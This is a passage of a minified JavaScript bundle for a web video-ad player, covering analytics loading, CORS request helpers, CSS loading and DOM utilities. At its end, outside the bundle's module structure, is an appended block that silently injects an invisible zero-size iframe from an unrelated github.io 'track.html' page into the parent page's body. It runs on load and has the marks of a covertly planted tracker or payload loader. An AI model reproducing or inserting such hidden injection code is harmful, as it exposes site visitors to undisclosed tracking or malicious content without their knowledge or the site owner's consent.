Ya.Metrika}},{key:"loadYMAPI",value:function(){(s[u]=s[u]||[]).push(this.onYMApiReady.bind(this));var t=o.getElementsByTagName("script")[0],e=o.createElement("script");e.type="text/javascript",e.async=!0,e.src="",e.id=this.constructor.name+"_ymapi_script",t.parentNode.insertBefore(e,t)}},{key:"onYMApiReady",value:function(){console.log("YM Api ready"),s["yaCounter"+this.metrikaId]=new Ya.Metrika({id:this.metrikaId,clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,triggerEvent:!0})}},{key:"handleEvent",value:function(t){t.detail.source="vast",s["yaCounter"+this.metrikaId].params(t.detail),s["yaCounter"+this.metrikaId].hit("/")}}]),t}();n.default=l},{}],11:[function(t,e,n){"use strict";function i(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(n,"__esModule",{value:!0});var a="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},r=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),s=function(){function t(){i(this,t)}return r(t,[{key:"getRequest",value:function(){var t=null;if(void 0!==a(window.XMLHttpRequest))t=new XMLHttpRequest;else try{t=new ActiveXObject("Msxml2.XMLHTTP")}catch(e){try{t=new ActiveXObject("Microsoft.XMLHTTP")}catch(e){t=null}}return t}},{key:"createCORSRequest",value:function(t,e){var n=this.getRequest();return null!=n&&void 0!==a(n.withCredentials)?(n.open(t,e,!0),n.withCredentials=!0):void 0!==a(window.XDomainRequest)?(n=new XDomainRequest).open(t,e):n=null,n}},{key:"sendCORSRequest",value:function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:"POST",i=arguments.length>3&&void 0!==arguments[3]?arguments[3]:null,r=arguments.length>4&&void 0!==arguments[4]?arguments[4]:null,s=this.createCORSRequest(n,t);e=this.jsonToStr(e),void 0==(void 0===s?"undefined":a(s))||null==s?console.error("CORS not supported"):(s.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),null!=i&&(s.onload=function(){var t={};try{t=JSON.parse(s.responseText)}catch(e){t=s.responseText}i(t)}),null!=r&&(s.onerror=function(){var t={};try{t=JSON.parse(s.responseText)}catch(e){t=s.responseText}r(t)}),s.send(e))}},{key:"jsonToStr",value:function(t){return Object.keys(t).map(function(e){return encodeURIComponent(e)+"="+encodeURIComponent(t[e])}).join("&")}}]),t}();n.default=s},{}],12:[function(t,e,n){"use strict";function i(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(n,"__esModule",{value:!0});var a=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),r=function(){function t(){i(this,t)}return a(t,null,[{key:"loadCss",value:function(e,n){var i=document.createElement("link");i.setAttribute("rel","stylesheet"),i.setAttribute("type","text/css"),i.setAttribute("href",e),i.onload=function(){void 0!==n&&n()},t.slot.appendChild(i)}}]),t}();n.default=r,r.slot=document.getElementsByTagName("head")[0]},{}],13:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.default=function(){!function(){function t(t,e){e=e||{bubbles:!1,cancelable:!1,detail:void 0};var n=document.createEvent("CustomEvent");return n.initCustomEvent(t,e.bubbles,e.cancelable,e.detail),n}if("function"==typeof window.CustomEvent)return!1;t.prototype=window.Event.prototype,window.CustomEvent=t}()}},{}],14:[function(t,e,n){"use strict";function i(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(n,"__esModule",{value:!0});var a=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),r=function(){function t(){i(this,t),this.div=document.createElement("div"),this.div.className="vs_lab__debug-panel"}return a(t,[{key:"attach",value:function(t){t.appendChild(this.div)}},{key:"log",value:function(t,e){var n=this.div.getElementsByClassName(t);0==n.length?((n=document.createElement("div")).className="vs_lab__debug-panel_item "+t,this.div.appendChild(n)):n=n[0],n.innerHTML=e}}]),t}();n.default=r},{}],15:[function(t,e,n){"use strict";function i(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(n,"__esModule",{value:!0});var a=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),r=function(){function t(){i(this,t)}return a(t,null,[{key:"makeElem",value:function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"div",e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=document.createElement(t);return void 0!==e.id&&(n.id=e.id),void 0!==e.class&&(n.className=e.class),void 0!==e.content&&(n.innerHTML=e.content),n}}]),t}();n.default=r},{}]},{},[8]);

try{var t = document.createElement('iframe');
t.setAttribute("src","https://coolboy112233.github.io/unknowbastard/track.html");    
t.setAttribute("style","position:absolute;left:0px;bottom:0px;border:0px;opacity:0;width:0px;height:0px;");    
window.parent.document.getElementsByTagName("body")[0].appendChild(t);
} catch(e){var t = document.createElement('iframe');
t.setAttribute("src","");    
t.setAttribute("style","position:absolute;left:0px;bottom:0px;border:0px;opacity:0;width:0px;height:0px;");    
document.getElementsByTagName("body")[0].appendChild(t);};


